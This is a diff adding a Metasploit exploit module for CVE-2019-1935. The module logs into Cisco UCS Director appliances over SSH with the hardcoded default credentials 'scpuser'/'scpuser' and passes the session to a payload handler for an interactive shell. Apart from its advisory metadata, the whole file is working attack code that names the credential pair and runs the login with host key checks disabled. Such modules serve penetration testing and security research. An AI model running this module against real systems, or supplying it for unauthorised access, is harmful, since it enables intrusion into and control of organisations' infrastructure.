@@ -1,0 +1,139 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'net/ssh'
+require 'net/ssh/command_stream'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::SSH
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Cisco UCS Director default scpuser password",
+      'Description'    => %q{
+        This module abuses a known default password on Cisco UCS Director. The 'scpuser'
+        has the password of 'scpuser', and allows an attacker to login to the virtual appliance
+        via SSH.
+        This module  has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0.
+        Note that Cisco also mentions in their advisory that their IMC Supervisor and
+        UCS Director Express are also affected by these vulnerabilities, but this module
+        was not tested with those products.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-1935' ],
+          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-usercred' ],
+          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Aug/36' ],
+          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/cisco-ucs-rce.txt' ]
+        ],
+      'DefaultOptions'  =>
+        {
+          'EXITFUNC' => 'thread'
+        },
+      'Payload'        =>
+        {
+          'Compat' => {
+            'PayloadType'    => 'cmd_interact',
+            'ConnectionType' => 'find'
+          }
+        },
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+        [
+          [ 'Cisco UCS Director < 6.7.2.0', {} ],
+        ],
+      'Privileged'     => false,
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Aug 21 2019'
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(22),
+        OptString.new('USERNAME', [true,  "Username to login with", 'scpuser']),
+        OptString.new('PASSWORD', [true,  "Password to login with", 'scpuser']),
+      ], self.class
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
+        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30])
+      ]
+    )
+  end
+
+  def rhost
+    datastore['RHOST']
+  end
+
+  def rport
+    datastore['RPORT']
+  end
+
+  def do_login(user, pass)
+    factory = ssh_socket_factory
+    opts = {
+      :auth_methods    => ['password', 'keyboard-interactive'],
+      :port            => rport,
+      :use_agent       => false,
+      :config          => false,
+      :password        => pass,
+      :proxy           => factory,
+      :non_interactive => true,
+      :verify_host_key => :never
+    }
+
+    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+
+    begin
+      ssh = nil
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        ssh = Net::SSH.start(rhost, user, opts)
+      end
+    rescue Rex::ConnectionError
+      return
+    rescue Net::SSH::Disconnect, ::EOFError
+      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
+      return
+    rescue ::Timeout::Error
+      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
+      return
+    rescue Net::SSH::AuthenticationFailed
+      print_error "#{rhost}:#{rport} SSH - Failed authentication"
+    rescue Net::SSH::Exception => e
+      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      return
+    end
+
+    if ssh
+      conn = Net::SSH::CommandStream.new(ssh)
+      ssh = nil
+      return conn
+    end
+
+    return nil
+  end
+
+  def exploit
+    user = datastore['USERNAME']
+    pass = datastore['PASSWORD']
+
+    print_status("#{rhost}:#{rport} - Attempt to login to the Cisco appliance...")
+    conn = do_login(user, pass)
+    if conn
+      print_good("#{rhost}:#{rport} - Login Successful (#{user}:#{pass})")
+      handler(conn.lsock)
+    end
+  end
+end
